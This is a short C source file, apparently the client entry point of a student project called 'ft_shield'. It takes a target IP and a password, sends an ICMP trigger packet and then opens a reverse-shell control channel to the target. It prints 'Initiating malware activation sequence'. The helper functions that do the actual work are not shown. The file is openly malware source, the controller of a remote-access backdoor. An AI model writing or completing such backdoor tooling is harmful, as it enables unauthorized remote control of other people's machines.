# include "ft_shield.h"

volatile sig_atomic_t g_sigint_received = 0;
volatile sig_atomic_t g_sigalrm_received = 0;

void    cleanup(t_backdoor *backdoor)
{
    if (backdoor->socketfd != -1)
        close(backdoor->socketfd);
    free(backdoor);
}

int main(int argc, char **argv)
{
    t_backdoor  *backdoor;

    if (argc != 3)
    {
        printf("Use: %s <IP_target> <password>\n", argv[0]);
        return (1);
    }
    printf("Initiating malware activation sequence towards: %s\n", argv[1]);
    backdoor = malloc(sizeof(t_backdoor));
    if (!backdoor)
        return (1);
    backdoor->target_ip = argv[1];
    backdoor->buffer = argv[2];
    if (socket_creation(backdoor) != 0)
    {
        free(backdoor);
        return (1);
    }
    icmp_creation(backdoor);
    close(backdoor->socketfd);
    backdoor->socketfd = -1;

    sleep(1);

    printf("Opening communication channel with the reverse shell...\n");

    if (ft_shell_control(backdoor))
    {
        free(backdoor);
        return (1);
    }

    cleanup(backdoor);
    return (0);
}